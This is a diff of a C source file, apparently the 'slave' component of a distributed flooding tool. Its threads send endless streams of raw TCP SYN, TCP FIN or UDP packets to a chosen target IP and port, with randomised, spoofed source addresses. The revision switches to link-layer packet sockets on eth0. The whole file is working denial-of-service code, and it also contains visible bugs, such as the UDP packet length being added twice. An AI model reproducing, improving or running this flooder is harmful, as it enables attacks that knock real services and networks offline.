@@ -1,30 +1,34 @@
 #include <stdio.h>
-#include <pthread.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h> // close()
-#include <netinet/ip.h>
-#include <netinet/tcp.h>
-#include <netinet/udp.h>
-#include <arpa/inet.h>
+#include <stdlib.h>		// 
+#include <unistd.h>		// write(), close()
+#include <string.h>		// mem*()
+#include <time.h>		// time()
+#include <pthread.h>		// "pthread"
+#include <sys/ioctl.h>		// ioctl()
+#include <net/if.h>		// struct ifreq
+#include <net/ethernet.h>	// struct ether_header
+#include <netinet/ip.h>		// struct ip
+#include <netinet/tcp.h>	// struct tcphdr
+#include <netinet/udp.h>	// struct udphdr
+#include <arpa/inet.h>		// inet
+#include <netpacket/packet.h>	// struct sockaddr_ll
 
 #include "slave.h"
 #include "checksum.h"
 
 #define UDP_PAYLOAD 1000
 
-#define PTHREAD_FREE(ID)  do{ if( pthread_cancel((ID)) != 0 ) { perror("pthread_cancel()"); return false; } }while(0)
-
 static struct SlaveTable head;
 
 static void *startup(void *dst);
-static struct SlaveTable *alloc_slave(struct Flow *flow, pthread_t *tid);
+static struct SlaveTable *alloc_slave(const struct Flow * const flow, const pthread_t * const tid);
 
-void rawprint(uint8_t *packet, int len)
+
+void rawprint(const uint8_t * const packet, int packetlen)
 {
-	int i = 0;
 	printf("------- RAW -------\n");
-	while( i < len ) {
+	int i = 0;
+	while( i < packetlen ) {
 		printf("%02x ", *(packet+i));
 		if( ++i%16 == 0 ) printf("\n");
 	}
@@ -32,7 +36,8 @@ void rawprint(uint8_t *packet, int len)
 	else printf("-------------------\n");
 }
 
-bool slave_create(struct Flow *flow)
+
+bool slave_create(const struct Flow * const flow)
 {
 	struct SlaveTable *node = &head;
 	int times = flow->times;
@@ -42,7 +47,7 @@ bool slave_create(struct Flow *flow)
 
 	while( node->next != NULL ) {
 		node = node->next;
-		if( memcmp(&node->flow, flow, sizeof(struct Flow)) == 0 ) {
+		if( memcmp(flow, &node->flow, sizeof(struct Flow)) == 0 ) {
 			printf("Already Running\n");
 			return false;
 		}
@@ -51,51 +56,36 @@ bool slave_create(struct Flow *flow)
 	pthread_attr_init(&attr);
 	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
 
-//	printf("--- crreate\n");
-//	printf("%p / %p / %p / %p\n", &flow->ip, &flow->port, &flow->times, &flow->type);
-//	printf("%s / %d / %d / %d\n", inet_ntoa(flow->ip), flow->port, flow->times, flow->type);
 	for(i = 0; i < times; i++) {
 		if( pthread_create(&slave[i], &attr, startup, (void *)flow) != 0 ) {
-			perror("slave_create()/pthread_create()");
-
-			while( i-- > 0 )
-				PTHREAD_FREE(slave[i]);
-
+			perror("pthread_create(): ");
 			return false;
 		}
 	}
 
 	node->next = alloc_slave(flow, slave);
-	if( node->next == NULL) {
-		for(i = 0; i < times; i++)
-			PTHREAD_FREE(slave[i]);
-
+	if( node->next == NULL)
 		return false;
-	}
-//	printf("%p -> %p\n", &head, head.next);
-//	printf("%s / %d / %d / %d // %p / %p\n", inet_ntoa(node->next->flow.ip), node->next->flow.port, node->next->flow.times, node->next->flow.type, node->next->tid, node->next->next);
 
 	return true;
 }
 
-bool slave_delete(struct Flow flow)
+bool slave_delete(struct Flow *flow)
 {
 	struct SlaveTable *tmp, *node = &head;
+	int size = sizeof(struct Flow);
 	int times, i;
 
 	while( node->next != NULL ) {
-		if( memcmp(&flow, &node->next->flow, sizeof(struct Flow)) == 0 ) {
+		if( memcmp(flow, &node->next->flow, size) == 0 ) {
 			tmp = node->next;
 			times = tmp->flow.times;
 
 			for(i = 0; i < times; i++) {
-				PTHREAD_FREE(tmp->tid[i]);
-				/*
 				if( pthread_cancel(tmp->tid[i]) != 0 ) {
 					perror("pthread_cancel(): ");
 					return false;
 				}
-				*/
 			}
 
 			node->next = tmp->next;
@@ -112,111 +102,133 @@ bool slave_delete(struct Flow flow)
 	return false;
 }
 
+void slave_deleteall()
+{
+	struct SlaveTable *tmp, *node = &head;
+
+	if( node->next == NULL )
+		return;
+	else
+		node = node->next;
+
+	do {
+		tmp = node->next;
+		free(node->tid);
+		free(node);
+		node = tmp;
+
+	}while( node != NULL );
+}
+
 static void *startup(void *data)
 {
 	uint8_t packet[IP_MAXPACKET];
-	struct Flow *flow = (struct Flow *)data;
-	struct ip *iphdr = (struct ip *)packet;
-	struct tcphdr *tcphdr = (struct tcphdr *)((uint8_t *)iphdr + sizeof(struct ip));
-	struct udphdr *udphdr = (struct udphdr *)((uint8_t *)iphdr + sizeof(struct ip));
-	char *payload;
+	struct ifreq ifr;
+	struct sockaddr_ll sll;
+	int sockfd, done = 0;
 
+	int ethdrlen = sizeof(struct ether_header);
 	int iphdrlen = sizeof(struct ip);
-	int packetlen = 0;
+	int tcphdrlen = sizeof(struct tcphdr);
+	int udphdrlen = sizeof(struct udphdr);
+	int packetlen = ethdrlen + iphdrlen;
 	int payloadlen = 0;
 
-	int sockfd = 0;
-	struct sockaddr_in din;
-	int one = 1;
-//	const int *val = &one;
-//	printf("---- startup\n");
-//	printf("%p / %p / %p / %p\n", &flow->ip, &flow->port, &flow->times, &flow->type);
-//	printf("%s / %d / %d / %d\n", inet_ntoa(flow->ip), flow->port, flow->times, flow->type);
+	struct Flow flow;
+	struct ether_header *eth = (struct ether_header *)packet;
+	struct ip *iphdr = (struct ip *)(packet + ethdrlen);
+	struct tcphdr *tcphdr = (struct tcphdr *)((uint8_t *)iphdr + iphdrlen);
+	struct udphdr *udphdr = (struct udphdr *)((uint8_t *)iphdr + iphdrlen);
+	char *payload;
 
+	//printf("%s %d %d %d\n", inet_ntoa(flow->ip), flow->port, flow->times, flow->type);
 	memset(packet, 0, IP_MAXPACKET);
+	memcpy(&flow, (struct Flow *)data, sizeof(struct Flow));
 
-	/* IP HEADER */
+	/* Set Static Options */
+	eth->ether_type = htons(ETHERTYPE_IP);
+
 	iphdr->ip_hl = iphdrlen / sizeof(uint32_t); // 5
 	iphdr->ip_v = 4;
 	iphdr->ip_ttl = 128;
-	iphdr->ip_dst.s_addr = flow->ip.s_addr;
+	memcpy(&iphdr->ip_dst, &flow.ip, sizeof(struct in_addr));
 
-	packetlen += sizeof(struct ip);  // 20 bytes
-
-	if( flow->type == UDP ) {
-	/* UDP HEADER */
-		printf("UDP\n");
-		iphdr->ip_p = IPPROTO_UDP;
-
-		payload = (char *)udphdr + sizeof(struct udphdr);
+	if( flow.type == UDP ) {
+		payload = (char *)packet + packetlen + udphdrlen;
 		payloadlen = UDP_PAYLOAD;
 
-		udphdr->len = htons(sizeof(struct udphdr)+ payloadlen);
-		udphdr->dest = htons(flow->port);
+		iphdr->ip_p = IPPROTO_UDP;
+		udphdr->len = htons(udphdrlen + payloadlen);
+		udphdr->dest = htons(flow.port);
+
+		packetlen += udphdrlen + payloadlen;
 
 		packetlen += sizeof(struct udphdr) + payloadlen;
 
 	}else {
-	/* TCP HEADER */
-		payload = (char *)tcphdr + sizeof(struct tcphdr);
+		payload = (char *)packet + packetlen + tcphdrlen;
 
 		iphdr->ip_p = IPPROTO_TCP;
-		tcphdr->dest = htons(flow->port);
-		tcphdr->doff = sizeof(struct tcphdr)/ 4;  // 5
+		tcphdr->dest = htons(flow.port);
+		tcphdr->doff = tcphdrlen / 4;  // 5
 		tcphdr->window = htons(8192);
-		tcphdr->rst = tcphdr->psh = tcphdr->ack = tcphdr->urg = 0;
 
-		if( flow->type == SYN ) {
-			printf("SYN\n");
-			//payload = 05 b4 01 01 04 02
+		if( flow.type == SYN ) {
 			memcpy(payload, "\x05\xb4\x01\x01\x04\x02", 6);
 			payloadlen = 6;
 
-			iphdr->ip_len = htons(iphdrlen + sizeof(struct tcphdr) + 6);
+			iphdr->ip_len = htons(iphdrlen + tcphdrlen + 6);
 			tcphdr->syn = 1;
 		}else {
-			printf("FIN\n");
-			//payload = 0
-			iphdr->ip_len = htons(iphdrlen + sizeof(struct tcphdr));
+			iphdr->ip_len = htons(iphdrlen + tcphdrlen);
 			tcphdr->fin = 1;
 		}
 
-		packetlen += sizeof(struct tcphdr) + payloadlen;
-	}
-
-	/* PACKET */
-	if( (sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0 ) {
-		perror("startup()/socket()");
-		printf("[%lu] EXIT\n", pthread_self());
-		return NULL;
-	}
-
-	// Address family
-	din.sin_family      = AF_INET;
-	din.sin_addr.s_addr = flow->ip.s_addr;
-	din.sin_port        = htons(flow->port);
-
-	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-		perror("startup()/setsockopt()");
-		printf("[%lu] EXIT\n", pthread_self());
-		return NULL;
+		packetlen += tcphdrlen + payloadlen;
 	}
 
 	/* SEND PACKET */
 	srand(time(NULL) + pthread_self());
 
+	/* Set Packet Options */
+	if( (sockfd = socket(PF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0 ) {
+		perror("socket(): ");
+		return NULL;
+	}
+
+	memset(&ifr, 0, sizeof(struct ifreq));
+	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);
+
+	if( ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0 ) {
+		perror("ioctl(): ");
+		close(sockfd);
+		return NULL;
+	}
+
+	sll.sll_family = AF_PACKET;
+	sll.sll_ifindex = ifr.ifr_ifindex;
+
+	if( bind(sockfd, (struct sockaddr *)&sll, sizeof(sll)) < 0 ) {
+		perror("bind(): ");
+		close(sockfd);
+		return NULL;
+	}
+
 	while( 1 ) {
-		iphdr->ip_src.s_addr = rand();
+		/* IP HEADER */
 		iphdr->ip_id = rand();
+		iphdr->ip_src.s_addr = rand();
 		iphdr->ip_sum = 0;
 		iphdr->ip_sum = checksum((uint16_t *)iphdr, iphdrlen);
 
-		if( flow->type == UDP ) {
+		if( flow.type == UDP ) {
+		/* UDP HEADER */
 			udphdr->source = rand();
 			udphdr->check = 0;
 			udphdr->check = udp_checksum(iphdr, udphdr, payload, payloadlen);
 
 		}else {
+		/* TCP HEADER */
 			tcphdr->source = rand();
 			tcphdr->seq = rand();
 			tcphdr->ack_seq = rand();
@@ -224,19 +236,19 @@ static void *startup(void *data)
 			tcphdr->check = tcp_checksum(iphdr, tcphdr, payload, payloadlen);
 		}
 
-		if( sendto(sockfd, packet, packetlen, 0, (struct sockaddr *)&din, sizeof(struct sockaddr)) < 0 ) {
-			perror("startup()/sendto()");
-		}
+		//rawprint(packet, packetlen);
 
-		rawprint(packet, packetlen);
-		printf("IP %s\n", inet_ntoa(flow->ip));
+		/* SEND PACKET */
+		if( (done = write(sockfd, packet, packetlen)) != packetlen )
+			printf("Miss %d bytes\n", packetlen - done);
+
 		sleep(1);
 	}
 
 	close(sockfd);
 }
 
-static struct SlaveTable *alloc_slave(struct Flow *flow, pthread_t *tid)
+static struct SlaveTable *alloc_slave(const struct Flow * const flow, const pthread_t * const tid)
 {
 //	printf("--- alloc\n");
 //	printf("%p / %p / %p / %p\n", &flow->ip, &flow->port, &flow->times, &flow->type);
@@ -255,8 +267,8 @@ static struct SlaveTable *alloc_slave(struct Flow *flow, pthread_t *tid)
 		return NULL;
 	}
 
-	memcpy(tmp, flow, sizeof(struct Flow));
 	memcpy(tmp->tid, tid, flow->times * sizeof(pthread_t));
+	memcpy(tmp, flow, sizeof(struct Flow));
 	tmp->next = NULL;
 
 	return tmp;
